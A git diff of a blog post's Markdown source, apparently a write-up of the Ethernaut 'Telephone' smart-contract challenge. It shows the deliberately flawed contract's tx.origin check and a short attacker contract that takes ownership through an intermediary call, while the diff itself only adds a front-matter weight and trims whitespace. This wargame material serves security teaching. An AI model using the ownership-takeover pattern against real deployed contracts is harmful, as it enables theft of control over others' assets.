@@ -5,6 +5,7 @@ description: "Ethernaut challenge 04: Telephone contract ownership transfer vuln
 categories: ["Ethernaut", "Smart Contract Security"]
 tags: ["Ethernaut", "Solidity", "Smart Contracts", "Security"]
 draft: false
+weight: 4
 ---
 
 
@@ -13,7 +14,7 @@ draft: false
 ```solidity
 contract Telephone {
     address public owner;
-    
+
     function changeOwner(address _owner) public {
         if (tx.origin != msg.sender) { // 这里本意是防止合约调用，但逻辑反了
             owner = _owner;
@@ -40,11 +41,11 @@ contract Telephone {
 ```javascript
 contract TelephoneHack {
     Telephone public victim;
-    
+
     constructor(address _victim) {
         victim = Telephone(_victim);
     }
-    
+
     function attack() public {
         victim.changeOwner(msg.sender); // msg.sender 是你的 EOA
     }
